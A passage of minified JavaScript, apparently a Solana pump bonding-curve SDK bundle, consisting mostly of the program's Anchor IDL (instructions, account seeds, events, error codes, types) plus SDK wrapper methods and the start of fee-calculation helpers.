        return this.pumpAmmInternalSdk.coinCreatorVaultAta(t, e, n);
      }
      async setCoinCreator(t) {
        return this.pumpAmmInternalSdk.setCoinCreator(t);
      }
      async createPoolSolanaState(t, e, n, r, o = void 0, i = void 0) {
        return this.pumpAmmInternalSdk.createPoolSolanaState(t, e, n, r, o, i);
      }
      async swapSolanaState(t, e, n = void 0, r = void 0) {
        return this.pumpAmmInternalSdk.swapSolanaState(t, e, n, r);
      }
      async liquiditySolanaState(t, e, n = void 0, r = void 0, o = void 0) {
        return this.pumpAmmInternalSdk.liquiditySolanaState(t, e, n, r, o);
      }
      async collectCoinCreatorFeeSolanaState(t, e = void 0) {
        return this.pumpAmmInternalSdk.collectCoinCreatorFeeSolanaState(t, e);
      }
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var sg = {
    address: "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P",
    metadata: {
      name: "pump",
      version: "0.1.0",
      spec: "0.1.0",
      description: "Created with Anchor",
    },
    instructions: [
      {
        name: "buy",
        docs: ["Buys tokens from a bonding curve."],
        discriminator: [102, 6, 61, 18, 1, 218, 235, 234],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "fee_recipient", writable: !0 },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "associated_user", writable: !0 },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                {
                  kind: "account",
                  path: "bonding_curve.creator",
                  account: "BondingCurve",
                },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "amount", type: "u64" },
          { name: "max_sol_cost", type: "u64" },
        ],
      },
      {
        name: "collect_creator_fee",
        docs: [
          "Collects creator_fee from creator_vault to the coin creator account",
        ],
        discriminator: [20, 22, 86, 123, 198, 28, 219, 132],
        accounts: [
          { name: "creator", writable: !0, signer: !0 },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "creator" },
              ],
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "create",
        docs: ["Creates a new coin and bonding curve."],
        discriminator: [24, 30, 200, 40, 5, 28, 7, 119],
        accounts: [
          { name: "mint", writable: !0, signer: !0 },
          {
            name: "mint_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    109, 105, 110, 116, 45, 97, 117, 116, 104, 111, 114, 105,
                    116, 121,
                  ],
                },
              ],
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          {
            name: "mpl_token_metadata",
            address: "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s",
          },
          {
            name: "metadata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "mpl_token_metadata" },
            },
          },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "rent",
            address: "SysvarRent111111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "name", type: "string" },
          { name: "symbol", type: "string" },
          { name: "uri", type: "string" },
          { name: "creator", type: "pubkey" },
        ],
      },
      {
        name: "extend_account",
        docs: ["Extends the size of program-owned accounts"],
        discriminator: [234, 102, 194, 203, 150, 72, 62, 229],
        accounts: [
          { name: "account", writable: !0 },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "initialize",
        docs: ["Creates the global state."],
        discriminator: [175, 175, 109, 31, 13, 152, 155, 237],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
        ],
        args: [],
      },
      {
        name: "migrate",
        docs: [
          "Migrates liquidity to pump_amm if the bonding curve is complete",
        ],
        discriminator: [155, 234, 231, 146, 236, 158, 162, 30],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "withdraw_authority", writable: !0, relations: ["global"] },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "pump_amm",
            address: "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
          },
          {
            name: "pool",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [112, 111, 111, 108] },
                { kind: "const", value: [0, 0] },
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "mint" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "pool_authority",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 45, 97, 117, 116, 104, 111, 114, 105,
                    116, 121,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "pool_authority_mint_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_authority_wsol_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "amm_global_config",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    103, 108, 111, 98, 97, 108, 95, 99, 111, 110, 102, 105, 103,
                  ],
                },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "wsol_mint",
            address: "So11111111111111111111111111111111111111112",
          },
          {
            name: "lp_mint",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 95, 108, 112, 95, 109, 105, 110, 116,
                  ],
                },
                { kind: "account", path: "pool" },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "user_pool_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool_authority" },
                { kind: "account", path: "token_2022_program" },
                { kind: "account", path: "lp_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_base_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "token_program" },
                { kind: "account", path: "wsol_mint" },
              ],
              program: { kind: "account", path: "associated_token_program" },
            },
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "pump_amm_event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
              program: { kind: "account", path: "pump_amm" },
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "sell",
        docs: ["Sells tokens into a bonding curve."],
        discriminator: [51, 230, 133, 164, 1, 127, 131, 173],
        accounts: [
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "fee_recipient", writable: !0 },
          { name: "mint" },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "associated_bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "bonding_curve" },
                {
                  kind: "const",
                  value: [
                    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70,
                    206, 235, 121, 172, 28, 180, 133, 237, 95, 91, 55, 145, 58,
                    140, 245, 133, 126, 255, 0, 169,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "associated_user", writable: !0 },
          { name: "user", writable: !0, signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "creator_vault",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 45, 118, 97, 117, 108, 116,
                  ],
                },
                {
                  kind: "account",
                  path: "bonding_curve.creator",
                  account: "BondingCurve",
                },
              ],
            },
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "amount", type: "u64" },
          { name: "min_sol_output", type: "u64" },
        ],
      },
      {
        name: "set_creator",
        docs: [
          "Allows Global::set_creator_authority to set the bonding curve creator from Metaplex metadata or input argument",
        ],
        discriminator: [254, 148, 255, 112, 207, 142, 170, 165],
        accounts: [
          { name: "set_creator_authority", signer: !0, relations: ["global"] },
          {
            name: "global",
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "mint" },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [{ name: "creator", type: "pubkey" }],
      },
      {
        name: "set_metaplex_creator",
        docs: [
          "Syncs the bonding curve creator with the Metaplex metadata creator if it exists",
        ],
        discriminator: [138, 96, 174, 217, 48, 85, 197, 246],
        accounts: [
          { name: "mint" },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "mint" },
              ],
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "set_params",
        docs: ["Sets the global state parameters."],
        discriminator: [27, 234, 178, 52, 147, 2, 187, 141],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          {
            name: "authority",
            writable: !0,
            signer: !0,
            relations: ["global"],
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "initial_virtual_token_reserves", type: "u64" },
          { name: "initial_virtual_sol_reserves", type: "u64" },
          { name: "initial_real_token_reserves", type: "u64" },
          { name: "token_total_supply", type: "u64" },
          { name: "fee_basis_points", type: "u64" },
          { name: "withdraw_authority", type: "pubkey" },
          { name: "enable_migrate", type: "bool" },
          { name: "pool_migration_fee", type: "u64" },
          { name: "creator_fee_basis_points", type: "u64" },
          { name: "set_creator_authority", type: "pubkey" },
        ],
      },
      {
        name: "update_global_authority",
        discriminator: [227, 181, 74, 196, 208, 21, 97, 213],
        accounts: [
          {
            name: "global",
            writable: !0,
            pda: {
              seeds: [{ kind: "const", value: [103, 108, 111, 98, 97, 108] }],
            },
          },
          { name: "authority", signer: !0, relations: ["global"] },
          { name: "new_authority" },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
    ],
    accounts: [
      {
        name: "BondingCurve",
        discriminator: [23, 183, 248, 55, 96, 216, 172, 96],
      },
      {
        name: "Global",
        discriminator: [167, 232, 232, 177, 200, 108, 114, 127],
      },
    ],
    events: [
      {
        name: "CollectCreatorFeeEvent",
        discriminator: [122, 2, 127, 1, 14, 191, 12, 175],
      },
      {
        name: "CompleteEvent",
        discriminator: [95, 114, 97, 156, 212, 46, 152, 8],
      },
      {
        name: "CompletePumpAmmMigrationEvent",
        discriminator: [189, 233, 93, 185, 92, 148, 234, 148],
      },
      {
        name: "CreateEvent",
        discriminator: [27, 114, 169, 77, 222, 235, 99, 118],
      },
      {
        name: "ExtendAccountEvent",
        discriminator: [97, 97, 215, 144, 93, 146, 22, 124],
      },
      {
        name: "SetCreatorEvent",
        discriminator: [237, 52, 123, 37, 245, 251, 72, 210],
      },
      {
        name: "SetMetaplexCreatorEvent",
        discriminator: [142, 203, 6, 32, 127, 105, 191, 162],
      },
      {
        name: "SetParamsEvent",
        discriminator: [223, 195, 159, 246, 62, 48, 143, 131],
      },
      {
        name: "TradeEvent",
        discriminator: [189, 219, 127, 211, 78, 230, 97, 238],
      },
      {
        name: "UpdateGlobalAuthorityEvent",
        discriminator: [182, 195, 137, 42, 35, 206, 207, 247],
      },
    ],
    errors: [
      {
        code: 6e3,
        name: "NotAuthorized",
        msg: "The given account is not authorized to execute this instruction.",
      },
      {
        code: 6001,
        name: "AlreadyInitialized",
        msg: "The program is already initialized.",
      },
      {
        code: 6002,
        name: "TooMuchSolRequired",
        msg: "slippage: Too much SOL required to buy the given amount of tokens.",
      },
      {
        code: 6003,
        name: "TooLittleSolReceived",
        msg: "slippage: Too little SOL received to sell the given amount of tokens.",
      },
      {
        code: 6004,
        name: "MintDoesNotMatchBondingCurve",
        msg: "The mint does not match the bonding curve.",
      },
      {
        code: 6005,
        name: "BondingCurveComplete",
        msg: "The bonding curve has completed and liquidity migrated to raydium.",
      },
      {
        code: 6006,
        name: "BondingCurveNotComplete",
        msg: "The bonding curve has not completed.",
      },
      {
        code: 6007,
        name: "NotInitialized",
        msg: "The program is not initialized.",
      },
      { code: 6008, name: "WithdrawTooFrequent", msg: "Withdraw too frequent" },
      {
        code: 6009,
        name: "NewSizeShouldBeGreaterThanCurrentSize",
        msg: "new_size should be > current_size",
      },
      {
        code: 6010,
        name: "AccountTypeNotSupported",
        msg: "Account type not supported",
      },
      {
        code: 6011,
        name: "InitialRealTokenReservesShouldBeLessThanTokenTotalSupply",
        msg: "initial_real_token_reserves should be less than token_total_supply",
      },
      {
        code: 6012,
        name: "InitialVirtualTokenReservesShouldBeGreaterThanInitialRealTokenReserves",
        msg: "initial_virtual_token_reserves should be greater than initial_real_token_reserves",
      },
      {
        code: 6013,
        name: "FeeBasisPointsGreaterThanMaximum",
        msg: "fee_basis_points greater than maximum",
      },
      {
        code: 6014,
        name: "AllZerosWithdrawAuthority",
        msg: "Withdraw authority cannot be set to System Program ID",
      },
      {
        code: 6015,
        name: "PoolMigrationFeeShouldBeLessThanFinalRealSolReserves",
        msg: "pool_migration_fee should be less than final_real_sol_reserves",
      },
      {
        code: 6016,
        name: "PoolMigrationFeeShouldBeGreaterThanCreatorFeePlusMaxMigrateFees",
        msg: "pool_migration_fee should be greater than creator_fee + MAX_MIGRATE_FEES",
      },
      {
        code: 6017,
        name: "DisabledWithdraw",
        msg: "Migrate instruction is disabled",
      },
      {
        code: 6018,
        name: "DisabledMigrate",
        msg: "Migrate instruction is disabled",
      },
      { code: 6019, name: "InvalidCreator", msg: "Invalid creator pubkey" },
      { code: 6020, name: "BuyZeroAmount", msg: "Buy zero amount" },
      {
        code: 6021,
        name: "NotEnoughTokensToBuy",
        msg: "Not enough tokens to buy",
      },
      { code: 6022, name: "SellZeroAmount", msg: "Sell zero amount" },
      {
        code: 6023,
        name: "NotEnoughTokensToSell",
        msg: "Not enough tokens to sell",
      },
      { code: 6024, name: "Overflow", msg: "Overflow" },
      { code: 6025, name: "Truncation", msg: "Truncation" },
      { code: 6026, name: "DivisionByZero", msg: "Division by zero" },
      {
        code: 6027,
        name: "NotEnoughRemainingAccounts",
        msg: "Not enough remaining accounts",
      },
      {
        code: 6028,
        name: "AllFeeRecipientsShouldBeNonZero",
        msg: "All fee recipients should be non-zero",
      },
      {
        code: 6029,
        name: "UnsortedNotUniqueFeeRecipients",
        msg: "Unsorted or not unique fee recipients",
      },
      {
        code: 6030,
        name: "CreatorShouldNotBeZero",
        msg: "Creator should not be zero",
      },
    ],
    types: [
      {
        name: "BondingCurve",
        type: {
          kind: "struct",
          fields: [
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "complete", type: "bool" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "CollectCreatorFeeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "creator", type: "pubkey" },
            { name: "creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "CompleteEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "user", type: "pubkey" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
      {
        name: "CompletePumpAmmMigrationEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "user", type: "pubkey" },
            { name: "mint", type: "pubkey" },
            { name: "mint_amount", type: "u64" },
            { name: "sol_amount", type: "u64" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "pool", type: "pubkey" },
          ],
        },
      },
      {
        name: "CreateEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "name", type: "string" },
            { name: "symbol", type: "string" },
            { name: "uri", type: "string" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "creator", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
          ],
        },
      },
      {
        name: "ExtendAccountEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "account", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "current_size", type: "u64" },
            { name: "new_size", type: "u64" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
      {
        name: "Global",
        type: {
          kind: "struct",
          fields: [
            { name: "initialized", docs: ["Unused"], type: "bool" },
            { name: "authority", type: "pubkey" },
            { name: "fee_recipient", type: "pubkey" },
            { name: "initial_virtual_token_reserves", type: "u64" },
            { name: "initial_virtual_sol_reserves", type: "u64" },
            { name: "initial_real_token_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "fee_basis_points", type: "u64" },
            { name: "withdraw_authority", type: "pubkey" },
            { name: "enable_migrate", docs: ["Unused"], type: "bool" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "fee_recipients", type: { array: ["pubkey", 7] } },
            { name: "set_creator_authority", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetMetaplexCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "mint", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "metadata", type: "pubkey" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetParamsEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "initial_virtual_token_reserves", type: "u64" },
            { name: "initial_virtual_sol_reserves", type: "u64" },
            { name: "initial_real_token_reserves", type: "u64" },
            { name: "final_real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "fee_basis_points", type: "u64" },
            { name: "withdraw_authority", type: "pubkey" },
            { name: "enable_migrate", type: "bool" },
            { name: "pool_migration_fee", type: "u64" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "timestamp", type: "i64" },
            { name: "set_creator_authority", type: "pubkey" },
          ],
        },
      },
      {
        name: "TradeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "mint", type: "pubkey" },
            { name: "sol_amount", type: "u64" },
            { name: "token_amount", type: "u64" },
            { name: "is_buy", type: "bool" },
            { name: "user", type: "pubkey" },
            { name: "timestamp", type: "i64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "virtual_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "fee_recipient", type: "pubkey" },
            { name: "fee_basis_points", type: "u64" },
            { name: "fee", type: "u64" },
            { name: "creator", type: "pubkey" },
            { name: "creator_fee_basis_points", type: "u64" },
            { name: "creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "UpdateGlobalAuthorityEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "global", type: "pubkey" },
            { name: "authority", type: "pubkey" },
            { name: "new_authority", type: "pubkey" },
            { name: "timestamp", type: "i64" },
          ],
        },
      },
    ],
  };
  function ag(t, e) {
    return (n = t.mul(e)), (r = new Zn(1e4)), n.add(r.subn(1)).div(r);
    var n, r;
  }
  function ug(t, e, n) {
    if (n.eq(new Zn(0))) return new Zn(0);
    let r = !1;
    if (
      (null === e &&
        ((e = (function (t) {
          return {
            virtualTokenReserves: t.initialVirtualTokenReserves,
            virtualSolReserves: t.initialVirtualSolReserves,
            realTokenReserves: t.initialRealTokenReserves,
            realSolReserves: new Zn(0),
            tokenTotalSupply: t.tokenTotalSupply,
            complete: !1,
